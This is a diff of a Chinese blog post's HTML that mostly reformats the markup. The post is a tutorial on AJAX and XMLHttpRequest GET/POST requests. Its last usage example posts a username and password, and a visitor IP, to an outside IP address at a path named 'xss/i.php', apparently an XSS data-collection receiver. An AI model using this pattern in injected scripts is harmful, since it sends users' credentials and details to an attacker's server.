@@ -1,93 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>AJAX 的 XHR 请求与响应 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>AJAX 的 XHR 请求与响应</h1>
-      
-<div class="post-meta">
-    <time>2016-10-25</time>
-    
-    [<a href="/categories/JS">JS</a>](<a href="/tags/js">js</a>)
-</div>
-
-      <div><h3 id="0x00-什么是ajax">0x00 什么是AJAX</h3>
-<p>AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML<br>
-AJAX不是新的编程语言，而是一种使用现有标准的新方法。<br>
-AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页</p>
-<h3 id="0x01-示例">0x01 示例</h3>
-<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>AJAX 的 XHR 请求与响应 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>AJAX 的 XHR 请求与响应</h1><div class=post-meta><time>2016-10-25</time>
+[<a href=/categories/JS>JS</a>](<a href=/tags/js>js</a>)</div><div><h3 id=0x00-什么是ajax>0x00 什么是AJAX</h3><p>AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML<br>AJAX不是新的编程语言，而是一种使用现有标准的新方法。<br>AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页</p><h3 id=0x01-示例>0x01 示例</h3><pre tabindex=0><code>&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;head&gt;
     &lt;script&gt;
@@ -115,19 +38,14 @@ AJAX可在不重新加载整个页面的情况下与服务器交换数据从而�
     &lt;button type=&#34;button&#34; onclick=&#34;loadXMLDoc()&#34;&gt;修改内容&lt;/button&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>当点击&quot;修改内容&quot;后，文本就会改变，但html页面源码没变，只向服务器请求了文本</p>
-<h3 id="0x02-关于xhr">0x02 关于XHR</h3>
-<p>XMLHttpRequest是AJAX的基础，就是它与后台就行交互的<br>
-现在大部分浏览器都支持XMLHttpRequest对象(IE5和IE6使用ActiveXObject)</p>
-<pre tabindex="0"><code>//创建对象示例
+</code></pre><p>当点击"修改内容"后，文本就会改变，但html页面源码没变，只向服务器请求了文本</p><h3 id=0x02-关于xhr>0x02 关于XHR</h3><p>XMLHttpRequest是AJAX的基础，就是它与后台就行交互的<br>现在大部分浏览器都支持XMLHttpRequest对象(IE5和IE6使用ActiveXObject)</p><pre tabindex=0><code>//创建对象示例
 var xmlhttp;
 if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
   xmlhttp=new XMLHttpRequest();
 } else {// code for IE6, IE5
   xmlhttp=new ActiveXObject(&#34;Microsoft.XMLHTTP&#34;);
 }
-</code></pre><h3 id="0x03-利用xhr进行get请求">0x03 利用XHR进行GET请求</h3>
-<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+</code></pre><h3 id=0x03-利用xhr进行get请求>0x03 利用XHR进行GET请求</h3><pre tabindex=0><code>&lt;!DOCTYPE html&gt;
 &lt;html lang=&#34;en&#34;&gt;
 &lt;head&gt;
     &lt;meta charset=&#34;UTF-8&#34;&gt;
@@ -163,9 +81,7 @@ if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
     &lt;div id=&#34;myDiv&#34;&gt;&lt;/div&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>点击&quot;Request data&quot;时就会请求服务端的2.html</p>
-<h3 id="0x04-利用xhr进行post请求">0x04 利用XHR进行POST请求</h3>
-<pre tabindex="0"><code>// 简单的POST请求
+</code></pre><p>点击"Request data"时就会请求服务端的2.html</p><h3 id=0x04-利用xhr进行post请求>0x04 利用XHR进行POST请求</h3><pre tabindex=0><code>// 简单的POST请求
 xmlhttp.open(&#34;POST&#34;,&#34;demo_post.html&#34;,true);
 xmlhttp.send();
 
@@ -173,8 +89,7 @@ xmlhttp.send();
 xmlhttp.open(&#34;POST&#34;,&#34;ajax_test.html&#34;,true);
 xmlhttp.setRequestHeader(&#34;Content-type&#34;,&#34;application/x-www-form-urlencoded&#34;);
 xmlhttp.send(&#34;fname=Henry&amp;lname=Ford&#34;);
-</code></pre><h3 id="0x05-简单封装xhr">0x05 简单封装XHR</h3>
-<pre tabindex="0"><code>function createXHR () {
+</code></pre><h3 id=0x05-简单封装xhr>0x05 简单封装XHR</h3><pre tabindex=0><code>function createXHR () {
     var request = false;
     if (window.XMLHttpRequest) {
         request = new XMLHttpRequest();
@@ -211,8 +126,7 @@ function xhr_act(method,src,data){//封装POST和GET请求
         return xhr.responseText;
     }
 }
-</code></pre><p>简单使用：</p>
-<pre tabindex="0"><code>//GET的使用
+</code></pre><p>简单使用：</p><pre tabindex=0><code>//GET的使用
 var src=&#34;http://114.115.214.203/wyb/xss/i.php&#34;;
 xhr_act(&#34;GET&#34;,src+&#34;?ip=&#34;+ip,false);
 
@@ -222,35 +136,12 @@ var pass = &#34;123456&#34;;
 var src=&#34;http://114.115.214.203/wyb/xss/i.php&#34;;  //传送的地方 但是需要解决跨域问题
 data=&#34;username=&#34;+user+&#34;&amp;password=&#34;+pass;
 xhr_act(&#34;POST&#34;,src,data);
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
